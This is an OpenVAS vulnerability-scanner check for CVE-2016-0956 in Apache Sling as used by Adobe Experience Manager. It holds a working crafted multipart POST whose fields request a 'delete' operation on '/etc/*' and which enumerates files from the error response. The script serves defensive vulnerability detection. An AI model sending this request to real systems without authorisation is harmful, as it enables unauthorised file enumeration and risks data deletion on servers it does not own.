###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_sling_adobe_aem_info_disc_vuln.nasl 5813 2017-03-31 09:01:08Z teissa $
#
# Apache Sling Framework (Adobe AEM) Information Disclosure Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:adobe:experience_manager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807066");
  script_version("$Revision: 5813 $");
  script_cve_id("CVE-2016-0956");
  script_bugtraq_id(83119);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-03-31 11:01:08 +0200 (Fri, 31 Mar 2017) $");
  script_tag(name:"creation_date", value:"2016-02-11 14:43:49 +0530 (Thu, 11 Feb 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Apache Sling Framework (Adobe AEM) Information Disclosure Vulnerability");

  script_tag(name:"summary", value:"This host is installed with 
  Apache Sling Framework (Adobe AEM) and is prone to information disclosure 
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request
  and check whether it is able to enumerate local system files/folders.");

  script_tag(name:"insight", value:"The flaw is due to lack of proper security 
  controls and or misconfiguration.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  unauthenticated users to enumerate local system files/folders that are not 
  accessible publicly to unauthenticated users.

  Impact Level: Application");

  script_tag(name:"affected", value:"Apache Sling Framework version 2.3.6 as used in 
  Adobe Experience Manager 5.6.1, 6.0.0, and 6.1.0");

  script_tag(name:"solution", value:"Upgrade to Apache Sling Servlets Post 
  2.3.8 or later. For updates refer to http://sling.apache.org");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/39435");
  script_xref(name : "URL" , value : "https://helpx.adobe.com/security/products/experience-manager/apsb16-05.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_adobe_aem_remote_detect.nasl");
  script_mandatory_keys("AEM/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

##Code starts from here##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
dir = "";
reqsling = "";
ressling = "";
aemPort = 0;

# Get HTTP Port
if(!aemPort = get_app_port(cpe:CPE)){
  exit(0);
}

## Get Application Location
if(!dir = get_app_location(cpe:CPE, port:aemPort)){
  exit(0);
}

## Get host name or IP
host = http_host_name(port:aemPort);
if(!host){
  exit(0);
}

## Construct Vulnerable Url
url =dir + "libs/granite/core/content/login.html";

## Construct the attack request
postData = string('--------------------------87cb9e2d2eed80d5\r\n',
                  'Content-Disposition: form-data; name=":operation"\r\n\r\n',
                  'delete\r\n',
                  '-------------------------87cb9e2d2eed80d5\r\n',
                  'Content-Disposition: form-data; name=":applyTo"\r\n\r\n',
                  '/etc/*\r\n',
                  '--------------------------87cb9e2d2eed80d5--\r\n');

#Send Attack Request and Receive response
reqsling = string("POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Content-Length: ", strlen(postData), "\r\n",
                  "Content-Type: multipart/form-data; boundary=------------------------87cb9e2d2eed80d5\r\n",
                  "\r\n", postData, "\r\n");
ressling = http_send_recv(port:aemPort, data:reqsling);

#Confirm Exploit 
if (ressling && 'id="ChangeLog' >< ressling && 
    ressling =~ "HTTP\/1\.[0-9] 500")
{
  report = report_vuln_url(port:aemPort, url:url );
  security_message(port:aemPort, data:report);
  exit(0);
}
